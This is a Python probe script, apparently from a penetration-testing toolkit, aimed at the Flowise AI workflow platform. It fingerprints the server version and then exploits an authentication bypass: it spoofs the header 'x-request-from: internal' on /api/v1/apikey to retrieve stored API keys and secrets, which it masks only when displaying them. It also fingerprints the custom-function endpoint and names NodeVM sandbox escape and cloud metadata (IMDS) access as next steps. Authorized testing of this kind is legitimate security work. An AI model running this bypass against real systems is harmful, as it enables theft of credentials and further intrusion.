#!/usr/bin/env python3
"""Flowise 表面：版本 + 内部头 apikey 差分（授权范围内）。

L1：/api/v1/version、/api/v1/ping、首页 Flowise。
L2：无头 vs x-request-from: internal 打 GET /api/v1/apikey。
不 POST /api/v1/node-custom-function（NodeVM 逃逸不内置）。
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-flowise"
VER_PATHS = ("/api/v1/version", "/api/v1/ping", "/api/v1/ready")
KEY_PATH = "/api/v1/apikey"
INTERNAL_HDR = "internal"


def _mask(val: str) -> str:
    s = str(val or "")
    if len(s) <= 8:
        return "***"
    return s[:4] + "…" + s[-2:]


def _get(sess: requests.Session, url: str, headers: dict | None = None) -> dict[str, Any]:
    try:
        r = sess.get(url, timeout=12, verify=False, allow_redirects=True, headers=headers)
    except Exception as e:
        return {"url": url, "error": str(e)[:120]}
    text = r.text or ""
    data: Any = None
    try:
        data = r.json()
    except Exception:
        data = None
    return {
        "url": url,
        "status": r.status_code,
        "size": len(text),
        "json": data,
        "snip": re.sub(r"\s+", " ", text)[:180],
        "flowise_html": "flowise" in text.lower()[:4000],
    }


def _version_of(blob: Any) -> str:
    if isinstance(blob, dict):
        for k in ("version", "flowiseVersion", "flowise_version", "appVersion"):
            v = blob.get(k)
            if v:
                return str(v)[:40]
    if isinstance(blob, str):
        m = re.search(r"(\d+\.\d+\.\d+(?:[-.][a-zA-Z0-9.]+)?)", blob)
        if m:
            return m.group(1)
    return ""


def _affected(version: str) -> bool | None:
    m = re.match(r"(\d+)\.(\d+)\.(\d+)", version or "")
    if not m:
        return None
    t = (int(m.group(1)), int(m.group(2)), int(m.group(3)))
    return t <= (3, 1, 2)


def _key_hits(data: Any) -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []
    items: list[Any] = []
    if isinstance(data, list):
        items = data
    elif isinstance(data, dict):
        for k in ("apiKeys", "apikeys", "keys", "data", "items"):
            v = data.get(k)
            if isinstance(v, list):
                items = v
                break
        if not items and any(
            x in data for x in ("apiKey", "apiSecret", "keyName", "secret")
        ):
            items = [data]
    for it in items[:8]:
        if not isinstance(it, dict):
            continue
        raw_key = it.get("apiKey") or it.get("key") or it.get("api_key") or ""
        raw_sec = it.get("apiSecret") or it.get("secret") or it.get("api_secret") or ""
        name = str(it.get("keyName") or it.get("name") or "")[:40]
        if raw_key or raw_sec:
            rows.append({
                "name": name,
                "apiKey": _mask(str(raw_key)),
                "apiSecret": _mask(str(raw_sec)),
            })
    return rows


def run(args: argparse.Namespace) -> dict[str, Any]:
    host = host_of(args.url)
    if not host or not in_scope(host):
        print(f"[!] 不在 scope：{host or args.url}", file=sys.stderr)
        sys.exit(2)

    base = args.url.rstrip("/")
    sess = requests.Session()
    sess.headers["User-Agent"] = UA

    home = _get(sess, base + "/")
    version = ""
    ver_hits: list[dict[str, Any]] = []
    for path in VER_PATHS:
        rec = _get(sess, urljoin(base + "/", path.lstrip("/")))
        rec["path"] = path
        ver_hits.append({k: rec[k] for k in rec if k != "json"})
        if not version:
            version = _version_of(rec.get("json")) or _version_of(rec.get("snip"))

    bare = _get(sess, base + KEY_PATH)
    internal = _get(sess, base + KEY_PATH, headers={"x-request-from": INTERNAL_HDR})
    bare_keys = _key_hits(bare.get("json"))
    internal_keys = _key_hits(internal.get("json"))
    keys = internal_keys or bare_keys
    header_bypass = bool(
        internal.get("status") == 200 and internal_keys and not bare_keys
    )
    unauth_open = bool(bare_keys)

    custom_fn = _get(sess, base + "/api/v1/node-custom-function")
    affected = _affected(version)
    level = "L2" if keys else ("L1" if version or home.get("flowise_html") else "none")

    report: dict[str, Any] = {
        "target": args.url,
        "ts": datetime.now(UTC).isoformat(),
        "product": "flowise",
        "version": version or "未知",
        "affected_le_3_1_2": affected,
        "level": level,
        "home_flowise": bool(home.get("flowise_html")),
        "version_hits": ver_hits,
        "apikey_bare": {
            "status": bare.get("status"),
            "size": bare.get("size"),
            "keys_masked": bare_keys,
            "error": bare.get("error", ""),
        },
        "apikey_internal": {
            "status": internal.get("status"),
            "size": internal.get("size"),
            "keys_masked": internal_keys,
            "error": internal.get("error", ""),
        },
        "node_custom_function_get": {
            "status": custom_fn.get("status"),
            "note": "只 GET 指纹，不 POST 逃逸",
        },
        "internal_header_leak": header_bypass,
        "unauth_apikey": unauth_open,
        "playbook": "传承/流思·内额.md",
        "next": (
            "L2 内部头旁路（打码）；NodeVM / IMDS 先问"
            if header_bypass
            else (
                "L2 无头也吐钥；记未授权面"
                if unauth_open
                else "无密钥泄露；记版本后换弱口/鉴权面"
            )
        ),
    }
    out = write_probe_json(
        report,
        case=args.case,
        out=args.out,
        case_subdir="1day",
        filename="flowise.json",
    )

    print(f"\n[*] Flowise 探测: {base}")
    print(f"  版本: {report['version']}  受影响(≤3.1.2): {affected}")
    print(f"  apikey 无头: {bare.get('status')}  内部头: {internal.get('status')}")
    if header_bypass:
        print(f"  ★ 内部头旁路 {len(internal_keys)} 条（无头无钥、带头有钥，已打码）")
        for row in internal_keys:
            print(f"    {row['name'] or '?'}  key={row['apiKey']}  secret={row['apiSecret']}")
    elif unauth_open:
        print(f"  ★ 无头也吐钥 {len(bare_keys)} 条（未授权开放，不是内部头差分）")
        for row in bare_keys:
            print(f"    {row['name'] or '?'}  key={row['apiKey']}  secret={row['apiSecret']}")
    else:
        print("  apikey: 未吐密钥")
    print(f"  node-custom-function GET: {custom_fn.get('status')}（不 POST）")
    print(json.dumps({
        "level": level,
        "version": report["version"],
        "header_bypass": header_bypass,
        "unauth_open": unauth_open,
        "out": str(out),
    }, ensure_ascii=False))
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="Flowise 版本 + 内部头 apikey 差分（不发 NodeVM 逃逸）")
    sub = ap.add_subparsers(dest="cmd", required=True)
    p = sub.add_parser("detect", help="L1 指纹 + L2 内部头差分")
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--case", default="")
    p.add_argument("--out", type=Path, default=None)
    args = ap.parse_args()
    if args.cmd == "detect":
        run(args)


if __name__ == "__main__":
    main()
